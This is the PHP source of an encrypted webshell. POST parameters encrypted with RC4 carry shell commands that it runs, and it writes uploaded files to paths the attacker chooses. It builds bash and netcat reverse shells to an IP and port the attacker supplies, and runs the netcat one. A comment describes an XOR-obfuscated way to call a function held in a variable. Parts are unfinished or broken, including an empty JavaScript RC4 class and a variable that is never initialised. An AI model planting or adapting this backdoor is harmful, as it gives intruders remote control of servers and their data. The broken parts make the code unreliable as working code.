<?php 
	// $_="_POST"
	// $_ = "{"; 
	// $_ = "_".($_ ^ "+").($_ ^ '4').($_ ^ '(').($_ ^ '/');
	// variable execute command = ${$_}["_"]()
 ?>

<?php 
	// Execute command
	if (isset($_POST['password']) && !empty($_POST['password'])){
		
		$cmd = $rc4 -> decrypt($_POST['password']);
		$output = shell_exec($cmd);
		echo $rc4 -> encrypt($output);
		return;
	}

	// Upload file
	if (isset($_POST['f']) && !empty($_POST['f']) && 
		isset($_FILES['data_upload']) && $_FILES['data_upload']['size'] > 0){

		// Decode input
		$filename 	= 	$rc4 -> decrypt($_FILES['data_upload']['name']);
		$folder 	= 	$rc4 -> decrypt($_POST['f']);
		$data 		= 	$rc4 -> decrypt(file_get_contents($_FILES['data_upload']['tmp_name']));

		// Condition
		if (file_exists($folder . $filename)){
			echo $rc4 -> encrypt("File exists.");
			return;
		}
		if (strlen($data) == 0){
			echo $rc4 -> encrypt("Decryption data has been fail.");
			return;
		}

		// Handle
		file_put_contents($folder . $filename, $data);
		// Can kiem tra su thanh cong cua upload

		// Encode output
		echo $rc4 -> encrypt($filename . " has been upoaded.");
		return;
	}

	// Reverse shell using bash
	if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
		isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
		isset($_POST['re_bash'])) {

		// Decode input
		$ip = $rc4 -> decrypt($_POST['ip']);
		$port = $rc4 -> decrypt($_POST['port']);

		// Handle
		$reverse_str = "/bin/bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
		echo $reverse_str;
		// shell_exec($reverse_str);
		return;
	}

	// Reverse shell using netcat
	if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
		isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
		isset($_POST['re_netcat'])) {

		// Decode input
		$ip = $rc4 -> decrypt($_POST['ip']);
		$port = $rc4 -> decrypt($_POST['port']);

		// Handle
		$reverse_str = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f";
		echo $reverse_str;
		shell_exec($reverse_str);
		return;
	}

	// test
	if (isset($_GET['test'])){
	}


 ?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Webshell</title>
	<link rel="stylesheet" href="">
	<!-- javascript -->
	<script src="js/jquery.min.js"></script>
</head>
<body>
	<input type="text" id="url" value="http://localhost" placeholder="http://">
	<input type="text" id="password" placeholder="Command line ...">
	<input type="submit" id="sendCommand" value="Execute">
	<input type="password" id="token" placeholder="password for encrypt"><br>
	<textarea id="output" id="" cols="30" rows="10" style="margin: 0px; width: 1345px; height: 549px;"></textarea>
	<input type="file" id="data_upload">
	<input type="submit" id="submit_file">

	<!-- javascript submit-->
	<script>
		$("#password").keydown(function(e){
			if (e.keyCode == 13){
				$("#sendCommand").trigger("click");
			}
		})
		$("#sendCommand").click(function(){
			let enctext = "";
			// encrypt data
			$.GET({
				url: "rc4.php",
				data: {
					'password'	: $('#password')[0].value,
					'token'		: $('#token')[0].value
				},
				success: function(data){
					enctext = data;
				}
			});
			// request command to shell
			$.POST({
				url: $('#url')[0].val,
				data: {
					'password'	: $('#password')[0].value,
					'token'		: $('#token')[0].value
				},
				success: function(data){
					enctext = data;
				}
			});
		});
	</script>

	<!-- Algorithm RC4 -->
	<script>
		class RC4 {
		  constructor(password) {
		    this.password = password;
		  }
		  
		  encrypt(text){

		  }
		  decrypt(cipher){

		  }
		  swap(a, b){
		  
		  }
		  mix(S, key){

		  }
		  gen_S(){

		  }
		  gen_key(){

		  }
		  gen_gamma(){

		  }
		}
	</script>
</body>
</html>

<?php 
// Algorithm RC4
class RC4{
	public function __construct($password){
		$this -> key 	= $this -> gen_key($password);
		$this -> S 		= $this -> gen_s_block();
		$this -> S 		= $this -> mix_s($this -> S, $this -> key);
	}

	public function encrypt($text){
		$cipher = "";
		$len = strlen($text);
		$gamma = $this -> gen_gamma($this -> S, $len);

		for ($i = 0; $i < $len; $i++){
			$cipher .= chr(ord($text[$i]) ^ $gamma[$i]);
		}
		return base64_encode($cipher);
	}

	public function decrypt($cipher){
		$text = "";
		$cipher = base64_decode($cipher);
		$len = strlen($cipher);
		$gamma = $this -> gen_gamma($this -> S, $len);

		for ($i = 0; $i < $len; $i++){
			$text .= $cipher[$i] ^ chr($gamma[$i]);
		}		
		return $text;
	}

	private function swap($a, $b){
		$tmp 	= $a;
		$a 		= $b;
		$b 		= $tmp;
		return [$a, $b];
	}

	private function gen_key($password){
		$key = "";
		for ($i=0; $i<256; $i++){
			$key .= $password[$i % strlen($password)];
		}
		return $key;
	}

	private function gen_s_block(){
		$s = "";
		for ($i=0; $i<256; $i++){
			$s .= $i;
		}
		return $s;
	}

	private function mix_s($s_block, $key){
		$j = 0;
		for ($i=0; $i < 256; $i++){
			$j = ($j + $s_block[$i] + $key[$i]) % 256;
			list($s_block[$i], $s_block[$j]) = $this -> swap($s_block[$i], $s_block[$j]);
		}
		return $s_block;
	}

	private function gen_gamma($s, $len){
		$result = "";
		$p = $q = 0;

		for ($i = 0; $i < $len; $i++){
			$p = ($p + 1) % 256;
			$q = ($q + $s[$p]) % 256;
			list($s[$p], $s[$q]) = $this -> swap($s[$p], $s[$q]);
			$t = ($s[$p] + $s[$q]) % 256;
			$result .= $s[$t];
		}
		return $result;
	}
}
 ?>